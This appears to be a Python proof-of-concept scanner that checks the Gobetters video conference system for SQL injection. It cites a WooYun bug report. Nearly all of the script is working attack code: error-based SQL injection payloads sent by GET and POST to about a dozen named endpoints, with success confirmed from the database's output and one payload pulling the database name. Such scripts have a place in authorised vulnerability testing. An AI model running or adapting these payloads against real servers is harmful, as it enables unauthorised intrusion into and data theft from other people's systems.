#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Gobetters视频会议系统SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0134733
author: Lucifer
description: Gobetters视频会议系统多处SQL注入漏洞。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class gobetters_multi_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payloads = ["/web/seeserver.php?machineid=1'AND (SELECT 6632 FROM(SELECT COUNT(*),CONCAT(0xc,(MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),0x7c,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
                    "/web/department/deptsave.php?deptid=1 AND (SELECT 3593 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&ac=del&level=0&parentid=0&dm=root",
                    "/web/android/dept.php?lan=1&deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
                    "/web/c/index.php?deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
                    "/web/onelanding/onelanding.php?username=1&deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
                    "/web/systemconfig/guangbo.php?id=12 AND (SELECT 5848 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&action=del&page=",
                    "/web/device/dept.php?deptcode=1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
                    "/web/users/depttree.php?deptid=-7276 OR ROW(1355,6771)>(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM (SELECT 8443 UNION SELECT 5201 UNION SELECT 3389 UNION SELECT 2860)a GROUP BY x)", 
                    ""]
        try:
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

            vulnurl = self.url + "/web/users/usersave.php"
            post_data = {
                "from":"123",
                "deptid":"0",
                "deptname":"123",
                "userid":"1 AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
                "level":"123",
                "username":"admin",
                "realname":"admin",
                "userpass":"admin",
                "sex":"1",
                "sex":"1",
                "email":"1@qq.com",
                "mobile":"123",
                "telephone":"123",
                "roleid":"0"
            }
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
            
            vulnurl = self.url + "/web/department/departmentsave.php"
            post_data = {
                "deptid":"1",
                "deptcode":"1",
                "deptlogo":"1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
                "deptdesc":"1"
            }
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

            vulnurl = self.url + "/web/monitor/monitormentsave.php"
            post_data = {
                "deptid":"1",
                "deptcode":"1",
                "deptlogo":"1'AND (SELECT 8709 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1",
                "deptdesc":"1"
            }
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

            vulnurl = self.url + "/web/users/result.php"
            post_data = {
                "username":"1'AND (SELECT 7173 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(Md5(1234) AS CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '1'='1"
            }
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                    cprint("[+]存在Gobetters视频会议系统SQL注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = gobetters_multi_sqli_BaseVerify(sys.argv[1])
    testVuln.run()